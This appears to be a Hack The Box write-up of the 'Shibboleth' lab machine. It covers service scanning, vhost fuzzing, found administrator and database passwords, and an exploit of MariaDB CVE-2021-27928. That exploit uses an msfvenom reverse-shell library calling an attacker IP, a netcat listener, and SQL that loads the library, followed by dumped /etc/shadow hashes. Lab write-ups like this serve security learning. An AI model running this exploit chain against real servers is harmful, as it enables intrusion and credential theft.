![image](PWND/Shibboleth.png)

# Nmap
```
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
add the domain to /etc/hosts
![image](https://user-images.githubusercontent.com/129129988/228408156-2cfb25fa-fd97-4be8-b10d-62fce761b5d6.png)

Access the website:
![image](https://user-images.githubusercontent.com/129129988/228408196-bec55885-b821-43db-8500-5e660e190b0a.png)

checking vhosts 

ffuf -u http://shibboleth.htb/ -H "HOST: FUZZ.shibboleth.htb" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-med
ium-words.txt -mc 200

![image](https://user-images.githubusercontent.com/129129988/228408242-9838da91-4db5-4948-a084-2605d21aab20.png)


 found monitor monitoring Monitor adding that to /etc/hosts
 
![image](https://user-images.githubusercontent.com/129129988/228408260-b2dbdd07-d353-4599-96ce-babad3060452.png)

 
 Team:

 walter white 
 chief executirve officer 
 
 sarah jhonson
 product Manager 
  
  william anderson 
  CTO
  
  Amanda Jepson 
  accountant
  
  
 loggin ?????
 
 
 Administrator:ilovepumkinpie1
 
 ![image](https://user-images.githubusercontent.com/129129988/228408291-a4fbc09b-2de5-4f0e-9998-9839f6be621f.png)
 
 after doing so you will get a shell on the port you specifed. 
 
 ![image](https://user-images.githubusercontent.com/129129988/228408338-b6724034-32e6-47eb-a118-9c178eaa7dbe.png)

 we cant test for sudo -l 
 
 ![image](https://user-images.githubusercontent.com/129129988/228408366-67e9ef4a-f506-47f3-baa9-32766d1802aa.png)
 ![image](https://user-images.githubusercontent.com/129129988/228408383-4d18c3b5-3064-43f9-9693-7be60ae2dd58.png)
  
 we can now access my sql db 
 
 ![image](https://user-images.githubusercontent.com/129129988/228408417-35066fa4-312d-4b15-8e05-bb7b64b55147.png)


 
checking version on mariadb 

database password: bloooarskybluh


https://github.com/Al1ex/CVE-2021-27928
found an exploit for 10.3.25

Step 1: on kali generate payload.
	sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.181 LPORT=6687 -f elf-so -o pwnd.so
	
Step 2: Start a listener
	nc -lnvp 6687

Step 3: Via Dumpfile
	python3 -c 'print(open("CVE-2021-27928.so", "rb").read().hex())'
	mysql -u <user> -p -h <ip>
	SELECT UNHEX('PYTHON_OUTPUT') into dumpfile '/tmp/CVE-2021-27928.so';

Step 4: Execute the Payload
	mysql -u <user> -p -h <ip>
	SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";

![image](https://user-images.githubusercontent.com/129129988/228408466-b8bab919-7034-424c-a537-0ffffb243e49.png)

cat /etc/shadow 

root:$6$HeRqkRJL9pttp4EY$TBE4vztPy9lOaywPhVdhQHwiPa09s7RJw418EMjmS0RKea/1QBwLqTHK84ato5yDBF59dMvSNbQQ1pVy.K1dp.:18741:0:99999:7::: 

PasswordHash: For PDF in ~/Downloads


ipmi-svc:$6$rnKUQQE9QwT1bVVt$7JWeqxtaYfMZa0EO0clguLK4Fh3N/IN6djXUl2M2MQ5PHVmQ1vLwlxnNMVhn7y/oEpjltVyvbw1wbBBZ//apV.:18925:0:99999:7::: 


 
